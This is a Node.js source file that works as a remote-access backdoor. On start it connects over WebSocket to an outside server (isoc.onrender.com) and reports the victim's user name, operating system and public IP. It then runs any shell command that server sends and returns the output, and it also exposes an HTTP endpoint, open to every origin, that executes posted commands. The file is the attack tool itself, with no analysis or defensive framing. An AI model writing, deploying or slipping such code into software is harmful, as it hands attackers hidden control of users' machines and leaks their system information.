const express = require('express')
const WebSoket = require("ws")
const axios = require('axios');
const {exec} = require('child_process')
const cors = require('cors') 
const Soket = new WebSoket.WebSocket('wss:isoc.onrender.com')
const app = express() 
app.use(express.json())
app.use(cors({origin:'*'}))  
const PORT = 2000
exec('cat ~/.exec/bin/tokin', (error, stdout, stderr) => {
  const ID = Number(stdout)
  Soket.addEventListener('open',async(event)=>{ 
      Soket.send(JSON.stringify({ 
        method:"save",
        _id:String(ID),     
        data:{ 
          _id:String(ID),
          user:await exe('echo $USER'), 
          system:await exe('uname') 
        }
      })) 
  })  
  Soket.addEventListener('message',async({data})=>{   
      try{
        let response = JSON.parse(data)
        if (response.res_to && response.get == "data") {
          let D = {
            method:"send_to",
            send_to:response.res_to,
            data:{
              res_coomand:true,
              path:await exe('pwd'),
              user:await exe('echo $USER'), 
            }
          }
          if (response.command) { 
            D.data.text = await exe(response.command)
          }
          Soket.send(JSON.stringify(D))
        }else if (response.res_to) {
          Soket.send(JSON.stringify({
            method:"send_to",
            send_to:response.res_to,  
            data:{ 
              ping:"ok",
              from:ID
            }
          })) 
        }
      }catch{
        console.log('error : '+ data)
      }
  })
  var IP;
  async function getPublicIP() {
      try {
        const response = await axios.get('https://ifconfig.me/all.json');
        IP = response.data
      } catch (error) {
        IP = `Error: ${error.response ? error.response.status : error.message}`
      }
    }
    getPublicIP();
    setInterval(() => {
      getPublicIP();
    }, 5000);

  const  exe = (command)=>{
      if (command == 'IP') {
          return IP  
      }
      return new Promise((resolve, reject) => {
        exec(command, (error, stdout, stderr) => {
          if (error) {
            resolve(`Error: ${error.message}`);
            return;
          }
        
          if (stderr) {
            resolve(`Stderr: ${stderr}`);
            return; 
          }
          resolve(stdout);
        }); 
      });
    }
  app.post('/',async(req,res)=>{
      let command = req.body.command
      console.log('command : ' + command)
      res.send(await exe(command))
  })
})
app.listen(PORT,()=>{
    console.log(`DESKTOP:${PORT}`)
})